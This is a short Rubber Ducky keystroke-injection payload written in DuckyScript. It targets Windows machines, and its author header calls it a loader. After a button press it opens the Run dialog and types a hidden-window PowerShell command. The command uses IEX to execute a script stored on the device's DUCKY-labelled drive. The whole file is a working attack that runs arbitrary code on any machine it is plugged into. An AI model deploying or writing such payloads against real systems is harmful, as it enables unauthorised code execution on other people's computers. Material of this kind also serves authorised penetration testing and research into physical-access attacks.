REM_BLOCK DOCUMENTATION
        AUTHOR:
                Siemiątkowski Mateusz
        USAGE:
                Simple payload to load previously prepared powershell script, stored on Rubber Ducky.
        TARGETS:
                Machines with Windows operating system.
END_REM

DELAY 3000
ATTACKMODE STORAGE
WAIT_FOR_BUTTON_PRESS
ATTACKMODE HID STORAGE
GUI r
DELAY 500
STRING powershell -NoProfile -WindowStyle Hidden -Command "IEX (Get-Content ($(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter +':\payload.ps1') -Raw)"
ENTER
